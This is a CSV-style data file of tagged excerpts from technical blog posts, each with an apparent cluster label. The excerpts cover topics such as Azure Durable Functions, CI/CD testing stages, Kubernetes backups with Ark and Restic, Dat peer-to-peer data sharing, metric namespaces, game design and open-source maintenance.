3179,"IPC between microservices Transporter is required to connect microservices between each other. In the case of server-side development, such solutions like NATS, Redis, MQTT or Kafka are usually used. In our case, a portable solution is needed. The options are: TCP Transporter MQTT Transporter (Mosca)TCP is the easiest one to use for this example. But please note, it is an experimental transporter. Do not use it in production yet! Bootstrap child process There are many ways how to spawn child processes in Node.js. Start by using T __url__ because it makes separate processes with a few lines of code.","['Electronjs', 'Microservices', 'Microservice Architecture', 'JavaScript', 'Desktop App']",11
3180,Orchestrator should be deterministic Tip 4. When to use Sub Orchestrator Tip 5. Dev Ops CD pipeline Tip 6. Http Client should be static Tip 7. Run-From-Zip deployment You can find Japanese version in here.,"['Azure Functions', 'Durable Functions', 'Serverless']",11
3181,"Delay)If you want to use these, you can use them in the Activity Functions. The reason is, orchestrator functions replay several times to build local state. Orchestrator functions write to the History table to update their state. After it sends a message to an Activity function, it goes to sleep. When it receives a response message from the Activity function, it reads the history from the history table, and then it replays the code until it reaches the previous code has been executed. That is why it should be deterministic. For more details, I recommend seeing this Power Point slide by Chris from P43. Also, I shoot three minutes video to understand the behavior.","['Azure Functions', 'Durable Functions', 'Serverless']",15
3182,"This tip is not specific to Durable Functions is for Azure Functions in general. If you instantiate many outbound traffic network clients like Http Client, it will causes a performance issue. The reason is, inside of the Scale Unit where the Function App resides, when it establishes an outbound connection with other services, it changes the configuration of the routing table, and it is very slow. Also, there are a limited number of outbound TCP ports. If too many connections are establish, all the ports can be used up and new connections will fail.","['Azure Functions', 'Durable Functions', 'Serverless']",11
3183,"This tip is also not only for Durable Functions but Azure Functions in general. We have several ways to deploy Durable Functions to the Function App. However, there is a cold-start problem for the Consumption plan. To minimize cold-start, We can use the Run-From-Zip deployment. All you need to do is zip your app, upload somewhere (like Azure Blob storage) and add the URL to App Settings. The consumption plan normally uses Azure File to share files among the VMs. This can cause slow cold-start performance. Using Run-From-Zip, contents can be extracted locally and loaded into memory. This deployment method will eventually become mainstream.","['Azure Functions', 'Durable Functions', 'Serverless']",11
3184,"The next step is about analysis: deducing exactly what pipeline problem you most need to solve. By examining your development process (which Ill refer to as your path to production) you can pinpoint where your biggest problems are coming from. Only when you know what problem youre trying to focus on solving can you make a well-reasoned tooling decision. The goal in examining your path to production is creating clear stages which will serve as checkpoints. In order to pass from one stage to the next, a build has to pass through these quality gates. The gates will be separated using various kinds of tests. Once tests are passed, quality at that level has been assured, and the build can move on.","['DevOps', 'Testing', 'Engineering', 'Product Development', 'Product Design']",1
3185,"Whats more, each stage requires different types of tests. As you move from staging toward production, the tests go from lighter weight to heavy-duty. The cost in resources increases with each stage as well. Heavy duty testing can only happen in more production-like environments, involving a full tech stack or external dependencies. In order to do these tests properly, theres more to spin up, and they require more expensive machinery. Therefore, its beneficial if you can do as much testing as possible in earlier environments, which are much less costly.","['DevOps', 'Testing', 'Engineering', 'Product Development', 'Product Design']",13
3186,"I want to mention that if your process doesnt look exactly like the one I describe below, thats OK. It might not right now, or ever. You may have a different purpose requiring a different flow. The goal here is to give you an idea of what stages, tests, and quality gates your pipeline could contain. Seeing the possibilities should help surface what, if anything, is missing from your development and testing workflow. Additionally, your organization might use different nomenclature than I use here, and that is fine, too. What is important here is thinking about levels of responsibility and how youre segregating those levels with tests.","['DevOps', 'Testing', 'Engineering', 'Product Development', 'Product Design']",13
3187,"Lets talk about the different types of tests:-Unit/component test: These cover the smallest possible component, unit, or functionality. Theyre the cheapest and fastest tests to run since they dont require a lot of dependencies or mocking. These should be done early to get them out of the way. -Integration test: These check how well each unit from the previous stage works with the other components, units, and functionalities. In a broader sense, it can test how services (such as APIs) integrate with one another. -UI layer testing: This is automated browser-based testing which tests basic user flow. It is expensive to set up and slow to run, so it should happen later in the pipeline.","['DevOps', 'Testing', 'Engineering', 'Product Development', 'Product Design']",13
3188,"This is the shortest-lived environment; it lives with the build. It gets created when a build gets triggered and torn down once the build is done. Its also the most unstable environment. As a developer, I check code into the CI environment. Since other developers could be deploying at the same time, the CI environment has a lot of deployment activities that are happening concurrently. As a result, the CI can, and often does, break. The key is fixing it when it does.","['DevOps', 'Testing', 'Engineering', 'Product Development', 'Product Design']",18
3189,"Tests: Unit tests, Integration testing with mocked components, UI testing with mocked data Scope of responsibility: Here you are concerned with the shared codebase youre merging your code into. Does your component work with the rest of your service? The development environment is a shared environment with other developers. In this environment, every service within the application is getting deployed every time. These environments are very unstable because there are constant changes from different teams all the time. Its important to note here that your integration and browser-based tests may now fail, even if they passed in the CI environment. Thats because they are now fully integrated with outside services and other services are also currently in development.","['DevOps', 'Testing', 'Engineering', 'Product Development', 'Product Design']",13
3190,"Scope of responsibility: The scope increases to integrations with other services. Does your service work with the other services it will need to connect to? This is the first manually deployed environment in this scenario. It is manually deployed because the QA team needs to decide which features are worth testing on their own, based on the structure of the changes. They might take a stacked change (Change A, B and C) and test them each separately. In this scenario, they test Change A, and once they have assurance that its working as expected, they can move on and test Change B and when it throws an error, they know that the issue is isolated to Change B. Otherwise, in the case of just testing Change C, if it were to throw an error, it would block progress on C, B, and A.","['DevOps', 'Testing', 'Engineering', 'Product Development', 'Product Design']",13
3191,"Now youve completed sufficient testing of all kinds. Are there any potential user flow or security issues? Is there anything else you need to address before moving to the staging environment? This is the last environment before production. The purpose of staging is to have an environment almost exactly the same as production. When you deploy something into staging, and it works, you can be reasonably assured that that version wont fail in production and cause an outage. All environments help you catch potential issues; staging is the final check of confidence. Here it is important to have almost the same amount of data as you would in production. This enables you to do load testing, and test the scalability of the application in production.","['DevOps', 'Testing', 'Engineering', 'Product Development', 'Product Design']",13
3192,"What does it mean to write Hypertext Markup Language anyways? What does it mean to write Cascading Style Sheets? What should we understand from the expression? As it seems, designers think these are hard to learn programming subjects and developers think these are unimportant, easy to learn things, not coding, not languages. And they are most certainly wrong leaving these important components of web design almost orphan.",['Web Development'],19
3193,"Content is the king for a reason. It is the very reason itself that we are designing something. Without content, we can not draw a meaningful single line. HTML may not necessarily be a programming language, but it is a language as the name implies. It is a unique language like English for example. It has its own set of vocabulary and grammar rules. When we talk about writing HTML, we talk about translating the content to that language. If you are fluent, your translation will be clear, accessible, meaningful. Otherwise you are just copying and pasting the content into a sort of word processor. The content lives in its own kingdom, unrelated to the other layers.",['Web Development'],19
3194,"As we all know, the web is interactive. The web medium enables us to create cause and effect relations. The design is flexible and it reacts to the users actions. It also adapts to the medium it is displayed on. The status change of a button when hovered by the user is an interaction. The information that appears only when a certain button is touched is an interaction. And interaction also needs to be designed. This involves CSS and Javascript when needed.",['Web Development'],19
3195,"If a person with zero knowledge of web development would decide to get into the field, he/she could have written his/her first website by the evening, on Notepad. The will to learn is enough, they can inspect every example by viewing the source code. They can do endless trials and errors. This, is the essence of this industry. This, is how I started at this profession. This, is very important to keep accessible by every one, so that this profession may continue to exist and stay relevant.",['Web Development'],2
3196,"The term Front-end development is generated from a programming logic perspective. It is front-end for the aforementioned subjects live in the users browsers. It is development for it involves writing code. From a design perspective, this term is meaningless. So, maybe we should never have called it front-end development in the first place. It is the spot lying in the middle of design and development. It is equally important as design and development. Even if you consider it as the weakest link, a chain is no stronger than its weakest link.",['Web Development'],12
3197,"Here are the three files: Thanks to the magical property of XOR, all three of these servers contents can be recovered through, not three backup hard drives, but one single parity drive. The XOR will work in a similar fashion to the checksum we covered in the previous case. When we XOR together the contents of the three hard drives, we get the following: Tomorrow, a disk failure happens with server 2. The contents of server 2 have gone missing. We crack open the parity disk, which contains the XOR of the three servers. Hidden inside 01101001 00100111 01101101 00111111 01100111 01101001 01100101 01101000 00001010 is the original content of the destroyed server.","['Computer Science Theory', 'Discrete Math', 'Logic Gates', 'Network Security', 'Xor']",3
3198,Click Manage button next to your domainc. Navigate to the Advanced DNS tab and click on the Add New Record buttond. Select TXT Record and insert the details shown on Git Hub.,"['Github', 'Startup', 'Web Development', 'Programming', 'Software Development']",7
3199,"When you create a DNS TXT record on Namecheap, you will need to provide the details in the following format:i.e. Click Save all Changes(Please refer to the detailed steps here in case you got stuck. Wait for ~30 minutes for newly created host record(s) to take effect.8. Go back to Git Hubs Verify domain page and click Verify domain.","['Github', 'Startup', 'Web Development', 'Programming', 'Software Development']",7
3200,"This particular application was written for a mainframe (the picture above isnt the actual application, but I needed something that shouts antique). Data is inserted into the database through a number of interfaces, which we do not control. The system runs autonomous batches, that transform data. Because of this, using a Redis cache is not an option. So how do we access this data from a number of different microservices? One of the suggestions is, to create a single System of Record that controls access to the shared data. To do this there are a few different options available to us. One method is, to do a synchronous lookup (service to service). Another is, to use a shared metadata library. A third is to use asynchronous events using a cache but for reasons mentioned before, this is out of the equation. In keeping with the nature of microservices I decided on the first pattern and set out to build a service the sole purpose of which it is to obtain shared data, and communicate this data to other services.","['Microservices', 'Spring Boot', 'Database', 'Grpc', 'Protocol Buffers']",8
3201,"This has been a bit of a journey of discovery, and I cannot tell if this particular pattern will suit your needs. I may have made some incorrect assumptions, also. What I can say is that this has been a great exercise. Ill continue to build on this, and there will most likely be another article that outlines my future experiences with using this pattern.","['Microservices', 'Spring Boot', 'Database', 'Grpc', 'Protocol Buffers']",14
3202,"One of the first problems we faced when using a p2p system for sharing datais how does one create a single source of truth when you might want to revokeaccess or change the data at any given time? How are those changes going tobe reflected in a p2p network. Weve explored several ideas around this, usingan SQL database, using Hyper DB, recursive encryption using HMAC, and also a No SQL database. At the core of each one of the usages, we leverage Dat to ultimately share this data over the p2p networking that comes built-in. To answer which one of these solutions would work best, we need to answer a few questions about what is a single source of truth, what does it mean to subscribe to data, and how can fine grained control be implemented for each set of data? Ill answer these questions in the following sections.","['P2p', 'Dat', 'JavaScript', 'Decentralized Web', 'Cryptography']",8
3203,"So what is a single source of truth? The way we have defined it at Lens is that it is data where the original dataset is owned by the end user and can only be changed by that end user. All other changes can easily be rejected by the underlying network. Additionally, any change that the user makes, will eventually be reflected throughout the entire network. So if I want to share my phone number with a number of different services or users, I give them a link to that number. As a result, whenever I need to change that number, I dont have to access each one of those entities separately and update the phone number. I simply update the number in one place and all other subscribers will get those changes. So the single source of truthreally means that you can update information for everyone who is interested in it! This leads us to the next question, how can we have fine grained control of this data? maybe I only want to share my work phone with one person and my mobile phone with another, how can we implement this with a single source of truth? There are a number of ways to implement access control for data. At the corethough, we want to provide a similar system that Linux provide to users on a single machine. For example, user directories are completely hidden from other users unless explicit access is given to another user from the owner. This is known as capability based security and is the mechanism that is used at Lens to give fine grained access to interested parties from the owner of the data. We extend this idea over a peer-to-peer network so that data can be published and subscribed to from a single bucket of data. So how can we achieve this goal? As we have mentioned before, we are building much of our P2P infrastructure off of the libraries built for the dat Project. The dat Project itself is a capability system. In other words, the encryption key that is posted on the P2P network is unguessable so it must be given to the desired party out-of-band. So the only way to access my data is to know my dat URL. For example, I might create the following JSON object to represent my contact information and store that file in a directory:now to share that information with another party, I would simply got to mydirectory and then run `dat share.`. This would generate a nice dat url like: Now, when I give that url to that party, they would be able to do a dat clone dat:9a0 to get my data! Voila, we have a capability system. Now if I want to share my single source of truth with other users, I simply give them my dat url. That way, if my phone number did change, all I would have to do is update the data in my dat directory. There is a slight problem though. What if I want to revoke access to a specific person now? Well one way would be to delete the data in that dat url, create a new one, and give that new dat URL to all the people that should have access. This process would become quite cumbersome and hard to keep track of. This is where programming can really come in handy! The first method we have implemented here at Lens has to do with syncing all the source data with all the Lenses that get shared. The process involves a few steps: User creates a data source User creates a Lens from one or more data sources and their fields.","['P2p', 'Dat', 'JavaScript', 'Decentralized Web', 'Cryptography']",8
3204,"User shares that Lens with interested parties When user updates any fields in the data sources, the Lens is automatically updated So when the user updates their data, all of the lens subscriptions are updated as well. This is where having a Lens to data becomes a very powerful concept. With this method, companies that need a legitimate subscription to your data simply subscribe to your lens. Then if they ever need to pull it up in the database, they will always have the latest version of the data you want to share with them. As an example, lets say you have some friends that are interested in starting an ice creamery. As one of their first steps in procuring the resources for this new business, they ask you for a Lens to your favorite ice cream and also to your e-mail address so they can get in touch with you about your favorite. As a result, you give them a Lens subscript that combines to different data schemas that are stored in your Lumen. The fist data schema is called Contact Infothis is where you keep your latest contact information that you want to give out. The second schema is called Favoritesthis where you like to keep a list of your favorites in ice-creams, beers, etc. You have no need to share each schema in their entirety, but rather you simply want to share a part of each one. As a result, the lens software creates a Lens from each one of these data sources, and references the original data set that way everything can be kept in sync. The figure below demonstrates this process.","['P2p', 'Dat', 'JavaScript', 'Decentralized Web', 'Cryptography']",6
3205,"One of the problems with the implementation above is that we now must create a dat URL for every bit of data that might be requested of us. At first this might not seem like a problem, but our digital selves are only growing, not shrinking. More and more of our lives are being digitized for convenience, accountability, accessibility and much more. I did a bit of browsing my password manager today and realized that I have over 200 accounts on various websites. Granted Ive created these accounts over the course of a lifetime, but that number is not going to shrink. So at a minimum, our users could have hundreds if not thousands of Lenses. This becomes difficult to manage from a technical standpoint because there are only so many ports and file handles available on a system so eventually we would run out. Not to mention that current implementations of the Dat protocol use quite a bit of memory per share. For our early product however, this limitation is not going to be a problem.","['P2p', 'Dat', 'JavaScript', 'Decentralized Web', 'Cryptography']",17
3206,"I should write a separate post about how and why I conduct interviews the way I do, but overall Im treating it as a conversation and theres give and take on both sides. What have you done in the past? What did you find worked well? What would you do differently now? When Ive done that before heres what I saw Does that match your experience, or did you mitigate it somehow? And at a high level what Im seeking is to understandtheir approach to identifying and solving problems. Ultimately anyone who works professionally as a software developer is solving identified business problems and the go-to tool in their belt is code. And, once you separate it from any kind of product design, that code either solves the problem well or it doesnt. The only metric that matters is Will the business still be around tomorrow? Crappy quality in code can drag down that metric, but not always in obvious ways.",['Software Development'],0
3207,"Why do developers give those answers to that question? Those are the kind of things that are measurable and within ones control. Any of those answers can also be a crutch, because while theyre potentially useful theyre not alone sufficient. If those 10,000 tests never catch a bug before a customer sees it then they werent actually providing any value. They were costing development time to write them and run them, even if that run time cost is paid by build machines it still takes that much longer to get the code off the developers machine and on its way to production. Those tests are also friction for making changes, and they have to be maintained just like any customer facing code. Most of the things in that list directly affect a developers quality of life. Theyre going to be working in other peoples changes and debugging and trying to shape it to do new things while still doing old things, and for the most part the nameless developer in this scenario wants to quickly figure out the right place to do something, get it done, move past it, and not have to revisit it later because it turns out that there were some unintended consequences to their work that got discovered in production. Thats good enough motivation and that can be a fine list for those goals. If people are dealing with an inconsistent and unpredictable code base then its going to lead to frustration and ultimately attrition (one of the non-obvious ways bad code has an impact). Get enough attrition and its going to directly affect the business metric.",['Software Development'],13
3208,"Tests have a very specific and limited usefulness. Generally its better to err on the side of fewer tests Unit tests have costs: time to write, time to run, time to maintain. Unit tests functionally really only do two things: they exercise code, and when coupled with code coverage they can show how to hit error cases in the code. They dont verify correctness; they make sure the code behaves the way it was written. There will never be unit tests that catch something that wasnt thought of, and code coverage in these tests is super misleading because of the potential explosion of combinatoric states. Add in mocked dependencies that keep track of how many times a function is called and you just turned your implementation details into part of your interface contract.",['Software Development'],13
3209,"Avoid dependency injection as a pattern. Mocking is an anti-pattern, except in really specific scenarios DI is a way of making things more testable without thinking about what or why youre trying to test it. It leads away from principles of loose coupling and tight cohesion, even in the name of promoting it. For everything that can be injected that becomes a concrete part of the contract for the code that it will be implemented in terms of those services. Libraries that make mocking objects easy reinforce that behavior. Rather than using parameters to drive configurable behavior it becomes easy to write tests that basically treat implementation details as configuration objects. It becomes very difficult to reason about the true production state of those dependencies and how theyre being provided and interacting with each other.",['Software Development'],9
3210,"Behavioral metrics are superlative It is super important to understand how things are running in production. Whereas tests can only tell you answers to questions someone thought to ask, metrics can yield answers that beg new questions. Build dashboards based on important behavioral metrics. Build themed dashboards for different aspects of different features. Operational run books should have links to these dashboards. Whenever someone writes a new feature there should be metrics in place, and a sense of what those metrics will look like if things are going right and also if theyre going wrong.",['Software Development'],13
3211,"Latency and counters are easy things to record and match a developers mind set in the code. Avoid falling back on those being the core metrics emitted. This is the data-science version of the tests verify that the code runs the way I wrote it. Emit metrics based on external, ideally the way the customer experiences it, observations. Dont record something just because it was already conveniently expressed as a number.",['Software Development'],13
3212,"In as much as metrics can be used to measure success of a feature they can also be gamed. This wont usually be malicious, but its the nature of measuring anything. If youre trying to reduce the latency on an API that returns a list of the top 20 items for X a cheap way to reduce it is to change that 20 to 10. Is that the right/wrong thing to do? It shouldnt be done arbitrarily and there really had better be something else being measured that indicates the holistic impact of any trade off being made.",['Software Development'],13
3213,"For us, releases have been better than sprints. For one, the length can be variable. I realize this will actually be a negative once were more in production mode where a whole host of people will want to plan around a predictable cycle, and thats finethe length doesnt have to be variable. For where we are now, its extremely convenient. Just this week, we received a bolus of user feedback that we needed to act quickly on. Even though next months release had already started, we were able to create a smaller point release, group the new items together, and prioritize them ahead of the not-yet-started work for the bigger release. The team is now knocking out the highest value workand is this not the essence of being agile (or Agile)? I do not believe that Jira is an antipattern, but I do believe that any toolkit can be used productively or unproductively. We have used Jira and Confluence to put into practice our values of every person in the company having ownership of the success of the company by effectively linking business context to the granular detail of what were doing.","['Agile', 'Jira', 'Software Development', 'Product Management']",1
3214,The next step is to create a bucket for your backups. Ark and Restic will use the same bucket to store K8S configuration data as well as Volume backups. See instructions in Create a bucket to store your data. We are naming the bucket arkbucket and will use this name later to configure Ark backup location. You will need to choose another name for your bucket as IBM COS bucket names are globally unique. Choose Cross Region Resiliency so it is easy to restore anywhere.,"['Kubernetes', 'Ark', 'IBM', 'Cloud Storage']",7
3215,"From the Ark root directory, edit the file config/ibm/ __url__ file. Add your COS keys as a Kubernetes Secret named cloud-credentials as shown below. Be sure to update <access_key_id> and <secret_access_key> with the value from your IBM COS service credentials. The remaining changes in the file are in the section showing the Backup Storage Location resource named default. Configure access to the bucket arkbucket (or whatever you called yours) by editing the spec.objectstore.bucket section of the file. Edit the COS region and s3URL to match your choices. The file should look something like this when done: Run the following commands from the Ark root directory:kubectl apply -f config/common/00-prereqs.yamlkubectl apply -f config/ibm/05-ark-backupstoragelocation.yamlkubectl apply -f config/ibm/10-deployment.yamlkubectl apply -f config/aws/20-restic-daemonset.yaml Verify that Ark and Restic are running correctly on your IKS cluster with the following command:kubectl -n heptio-ark get podswhich should show pods running similar to this: Note above that the count may vary as there is one Ark pod and a Restic Daemon set (in this case 3 pods, one per worker node).","['Kubernetes', 'Ark', 'IBM', 'Cloud Storage']",7
3216,"With the following commands we will delete our application configuration and the PV associated and confirm they are removed: We can restore the application and volume with the following command: Restoring will take longer because we are dynamically provisioning another network drive behind the scenes. If we look at the status of our application it is pending: Within a minute or two we see our application is up and the volume recovered using the commands below (your pod name will differ). We dump our hello world file (hw.txt) and its contents are what we had per-disaster, mission accomplished! In the previous example we walked through the straightforward situation where we simply wanted to restore an old version of an IKS cluster configuration and volumes to the same IKS cluster it was backed up from. The scenario was more of a backup/restore rather than a DR recovery. You likely would not have the same cluster available to restore to (or even the same IBM cloud region given a real catastrophe). In a disaster scenario where the region comes back online quickly this is fine if we can still meet RPO, RTO requirements. Below we discuss how to achieve a few advance use cases including multi-region DR, rapid cloning of environments for developer use and DR to/from on premise K8S instances like IBM Cloud Private (ICP).","['Kubernetes', 'Ark', 'IBM', 'Cloud Storage']",7
3217,"A more likely DR scenario is where one would want to recover the backed up cluster in a completely different IBM Cloud Region from the original. As an example, I might have my primary cluster in IBM Cloud region US-East but have my DR cluster in US-South. The good news is that this scenario is easy to do with a little preparation and a similar set of steps. Rather then running the restore command on the US-East cluster I simply run on the US-South cluster (obviously you would have Kubectl client configured to US-South cluster). The one caveat with a cross region backup is that prior backing up and PVC you must remove labels tying the PVC to a local IBM Cloud region and zone. For each PVC to back up you would need to run the follow commands prior to backup command: With many PVCs this can be tiresome so a utility can be easily written. The utility can ideally be installed as an Ark pre-backup hook also.","['Kubernetes', 'Ark', 'IBM', 'Cloud Storage']",11
3218,"One can image many other useful scenarios where the desire is to backup/restore or migrate applications across clouds or to/from on premise Kubernetes. The good new is that Ark and Restic can support this as long as you have the same or equivalent volume storage available on the source and target. One scenario to try is to backup an IBM Cloud Private (ICP) on-prem cluster and restore it as an IKS cluster. One could imagine this as a dev/test cloning scenario with the developer using the cloud and IKS as an on-demand test bed. The destination cluster must have the same Kubernetes storageclass and compatible backend provisioner to that of the source. For example, if I am using the storageclass glusterfs on ICP and I want to restore to IKS I will need to provide the storageclass glusterfs in IKS. This can be done by simply adding a new storageclass definition for glusterfs on IKS but having it use the specification of something equivalent like ibmc-file-bronze (commonly used file volume provisioner on IKS).","['Kubernetes', 'Ark', 'IBM', 'Cloud Storage']",11
3219,"At the end of last year hashicorp announced consul-k8s as a mechanism to sync services to/from k8s and consul. We were excited to switch to a more k8s-native mechanism for syncing state to consul, and quickly started prototyping with it. Going into it we listed our requirements as: Configuration through k8s annotations Readiness sync High availability with no single point of failure (SPOF)Consul-k8s offers mechanisms to sync both from k8s consul and consul k8s. We dont have a need for consul k8s, so well focus on the k8s consul sync. Consul-k8s sync is focused on syncing services from k8s consul. This means that you can configure syncing etc. at the service-level in k8s through annotations. For example (borrowed from here): This configuration-through-annotation both dramatically simplifies templating and is significantly easier to understand.","['Consul', 'High Availability', 'Kubernetes', 'Infrastructure', 'Engineering']",11
3220,"After the code was written and the daemonset was deployed, we took a few pilot services to migrate over to this new system to do failure testing etc. After migrating the first service in stage, we found that not all the pods in k8s were in consul even though the sidecars were marked as ready. After digging around we confirmed that the pod was healthy, the service was in the agents services, and the agent was spewing errors in the logs that looked like: This log message is actually a known issue in upstream consul caused by an upgrade of the consul-agent. For our purposes, the cause here is not as important as the impact. This failure of the local consul-agent had shown us that the local agent Services API didnt take into consideration syncing the services to the rest of the cluster.","['Consul', 'High Availability', 'Kubernetes', 'Infrastructure', 'Engineering']",11
3221,The question now is: What is the best way to enable product teams to work with machine learning? The answer is: (like you might expected) There is no best way but different options depends on the size of the company and the sophistication level of the domain and the desired machine learning products. These options are not exclusive so they could be applied all together if it would make sense for the case: Integrating data scientists in the feature teams: This is a good option when the team needs to work on low level machine learning with deep understanding of the algorithms. A nice side effect of this option is that the data scientists could spread their knowledge in the team by pair programming with other engineers and training them (i would say training not only the model could be an interesting task for a data scientist:) ). A big challenge of this option is keeping the data scientists integrated in the team and preventing of building team within the team. Also organizing the work of the team so that everyone has meaningful stuff to do could be a challenge for the product managers of the team.,"['Data Science', 'Artificial Intelligence', 'Engineering Organization', 'Engineering Mangement', 'Machine Learning']",12
3222,"Now lets return to our react app. In our react apps root folder create a new file called Dockerfile. $ touch Dockerfile After weve added the Dockerfile to our project, were going to build the image, tag it, and push it to our ECR to be deployed. To accomplish this follow the commands that are given to you in your ECR repository for uploading the image to the repository. My repository commands are below: Now, were going to create a task definition. A task definition will tell our details of how to run a set of containers. Go to the task definition tab of the ECS service. Select Create new Task Definition Select Fargate launch type on the next screen then select next step.","['Docker', 'AWS', 'React', 'Containers']",7
3223,"Make sure file names match their contents. Make sure CSS classes are written in the same style (eg. Pick a conventions like camel Case vs. snake-cased and stick with them everywhere. Alphabetize, group, or order properties appropriately.","['Software Development', 'Code', 'Tech', 'Programming']",19
3224,"Structured metric namespaces are important in order to have information quickly accessible during incidents. Careful consideration must be given to metric names and dimensions in order to support a wide variety of queries and expansions. One way Ive found to be effective at modeling flexible metric models is thinking of them as a tree. Thinking of metrics as a tree supports a number of benefits including: viewing specific subsets of data, defining a metric in terms of its children and establishing ratios. This post explores properties of metric namespaces that enable answering progressively more specific questions and allow drill down to subsets of the data as well as viewing a metric in terms of the metrics that its composed of. Many of these concepts will be familiar as they are first class ideas of cloud native monitoring solutions such as Prometheus and Dog Stats D.","['DevOps', 'Software Development', 'Software', 'Software Engineering', 'Software Testing']",14
3225,Metric spaces are the conceptual space where metrics live. They are often bounded within a database or an account: The metric space is not only where metrics live but also encompasses structures within a metric space. Correct naming and structure unlocks a number of huge benefits. The metric namespace in the diagram above has no explicit structure. Each metric is floating and space. They dont share anything other than the fact that they exist in the same metric space. In this structureless setup each metric has to be used individually. In order to see the rate of http requests for a service it needs to be accessed directly service_N_http_requests_total.,"['DevOps', 'Software Development', 'Software', 'Software Engineering', 'Software Testing']",8
3226,"Suppose that its useful to see the total number of requests being made across all instances of service. In the example above what happens if a new service is created? If the sum is being calculated from service_1 and service_2 when service_3 is added, there is nothing to connect them; theres no structure to the metrics. The request count doesnt reflect the actual total request count until service_3_http_requests_total is manually added to the sum. This can be seen in the chart below: One alternative to a structureless space is to adopt an explicit structure using the metric as a namespace. The following chart illustrates this structure as a tree: In Prometheus and Datadog metric structures are created using labels and tags, respectively. Using tags, expanding the total rate is dynamic; whenever a new service is added, it has a reference through the tree to the main metric.","['DevOps', 'Software Development', 'Software', 'Software Engineering', 'Software Testing']",8
3227,"Also check out my posts on (Programming, Tech Art, and Biz Dev)I worked on Sausage Sports Club for 3 years and learned an insane amount in the process. I was incredibly lucky to be surrounded by experienced and generous game makers in that time who were willing to give feedback, advice, and help push me and my game forward every step of the way. I know few people have that privilege, so this post is to lower the ladder a bit and hopefully make making games a little bit easier. Here are the topics I cover in this post: Design Pillars Defining project goals to judge decisions against Player Select Lessons from refining first time user experience Adventure Mode Building replayable seasons of a procedural sitcom Progression Improving engagement and retention with juice Level Design Workflow optimization and encouraging exploration Camera Reducing complexity in a multi-target, zone-based camera Every design decision made along the way was based on a few design pillars I set at the start of the project. Its not necessary to do this, but defining pillars is useful in deciding what game youre trying to make and in giving some semblance of objectivity to making design decisions. When faced with any question in designing your game, you can always check whether they support these pillars.","['Design', 'Games', 'Unity', 'Game Development', 'Programming']",6
3228,"Id already spent 1.5 years on the game and didnt have any project-related debt, so why not follow through in making it the best thing I could and give it the best chance to succeed? Its a reality TV show where youll meet NPCs and help them solve interpersonal drama by competing in sports matches. On each day of the season, more of the Overworld will open up and give access to new biomes filled with toys and entrances new arenas. As you play, youll unlock new characters and skins, while also earning coins youll use to unlock hats. Most importantly, each playthrough holds new quests and arrangements of the Overworld meaning your adventure is always different. Elevator pitch aside, how does this work? I knew there was a limit to how much content I could make alone, so instead of making one linear story that would only last one playthrough, I chose to make many short stories that could be re-arranged, interspersed with random sports matches, and replayed. I referenced sitcoms which similarly have short episodes, always feature the same characters, and can be watched for the most part in any order or combination without being too confusing.","['Design', 'Games', 'Unity', 'Game Development', 'Programming']",2
3229,"At the start the start of this process I take a lot of notes and tear up the sketch a lot more, then as things get more refined I go back and forth making little tweaks. Ill also throw on temp materials to various objects in Unity to help get a sense of how the space will look as it gets farther along. Once Im happy with the layout of a level, Ill start polishing in that same FBX by replacing primitives with higher poly shapes. Im pretty frivolous about using many materials since I use a lot of tiling textures and find optimizing UVs boring. I generally only split props out into separate FBXs. Unless something has an especially simple shape I almost always use a mesh colliders for static geometry. For anything dynamic Ill place a few colliders to approximate the shape.","['Design', 'Games', 'Unity', 'Game Development', 'Programming']",14
3230,"Developing a new product is an expensive proposition. With great cost comes great risk that the return on investment will be too little to justify the products development price tag. Cutting back on the features that go into a product is a big part of reducing risk with any new idea. The philosophy of MVP is to cut out everything except the core features an early customer would demand. The product is still valuable because it allows the customer to solve some problems. So, the product is viable, but only minimally so.","['AWS', 'Serverless', 'React', 'MVP', 'Startup']",12
3231,"My first OSS project is probably my most successful project. I remember I was working at an agency, creating e-commerce sites for large fashion brands in NYC. I was a senior dev on the team, and I was typically pegged to do the heavy JS work. Journey with me back to the j Query days Funny thing about fashion e-comm, there are carousels EVERYWHERE. They also tend to have elaborate, complex ambitious designs. It got to the point where existing carousel/slider libraries were not flexible enough to support the designs I was being given, so I started writing carousels from scratch, in Coffee Script. It worked, but it certainly didnt earn me any popularity points with my coworkers.",['Open Source'],2
3232,"So I saw a clear need. A need for a carousel plugin that was flexible enough to support anything designers threw at us, easy to use, and easy to modify. And then I decided that it was so helpful, why not save everyone else a bunch of time, so I open sourced it Turns out it did save everyone else a bunch of time, and people seemed to like it. The first few months after releasing it, the popularity was through the roof. I was new to OSS, and so excited that people were actually using my stuff that I would stay up entire nights quickly fixing issues, pushing releases out and making sure no one could compete with it.",['Open Source'],6
3233,"Open source is a lot like giving talks. Many people dont think what they are selling is valuable enough. If you read the stuff on imposter syndrome, its totally true. Every single person has their own corner of the knowledge pie, and no single person has the whole pie. There is always someone who needs what you are selling.",['Open Source'],16
3234,"My advice: Whats the worst that could happen? I got news for you kiddo, you could put out the most perfect, useful, fuckin mind blowing code that ever touched Git Hub and guess what? Some asshole is gonna come in and whine about something. Worst case scenario, you learn something. Someone will be like, Hey this makes performance suck and you can either be like, Ugh Im bad at programming, I quit or you can be like Oh wow, thanks for the tip, just fixed it, now its better. Be the person who makes it better.",['Open Source'],13
3235,"First and foremost, have a look at competitors and prior art. If someone elses library does the same thing yours does, youll need something that sets it apart. Lets say you want to build the next lodash. Good fuckin luck (sorry had to get that out of the way). But outside of that, in order to tap into lodashs market share, youd need to have a hook. It would have to be smaller, or faster, or a better API. See where Im going with this? Speaking of API design, there needs to be a balance. You could make a library that just works out of the box without doing anything, but then people will complain about wanting to tinker. You could make the most flexible, configurable library of all time, but then you would be Tobias Koppers/ Sean T. Larkin and people would complain about having to configure it (Sorry Sean, I had to.",['Open Source'],19
3236,Im not kidding here at all. Your docs need to be the best docs ever written. Avoid saying condescending shit like just and simply. You need a header link index thing at the top. You need a getting started section that explains in excruciating detail how to get this running the first time. You need every nook and cranny of the API documented in ridiculous detail.,['Open Source'],19
3237,"You should have that shit covered, at a reasonable percentage. Heres why: It will inspire confidence in the health of your library It will let you confidently merge PRs It will let you confidently work on it after being away from the project for a while One time I released a library, no tests, and Paul Irish chimed in and was like, Would be cool if it had some tests. Naturally, I was like, Holy shit, its Paul and went to write tests. I UNCOVERED LIKE 15 BUGS FROM WRITING THOSE TESTS! If you do anything at all, write some god damn tests. It would have saved me so much time and grief.",['Open Source'],13
